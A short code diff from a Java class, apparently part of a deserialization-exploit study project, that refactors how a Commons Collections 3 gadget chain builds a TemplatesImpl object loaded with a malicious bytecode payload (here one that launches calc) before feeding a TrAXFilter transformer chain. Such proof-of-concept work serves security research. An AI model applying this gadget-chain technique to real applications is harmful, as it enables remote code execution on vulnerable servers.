@@ -26,11 +26,7 @@ public class CommonsCollections3 {
 //        ProcessBuilder processBuilder = (ProcessBuilder) instantiateTransformer.transform(ProcessBuilder.class);
 //        processBuilder.start();
 
-        byte[] bytes = Utils.getEvilPayload("calc");
-        TemplatesImpl templates = new TemplatesImpl();
-        Utils.setValue(templates , "_bytecodes", new byte[][]{bytes});
-        Utils.setValue(templates , "_name", "gadgets");
-        Utils.setValue(templates , "_tfactory", new TransformerFactoryImpl());
+        TemplatesImpl templates = Utils.createTemplatesImpl("calc");
 
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(TrAXFilter.class),
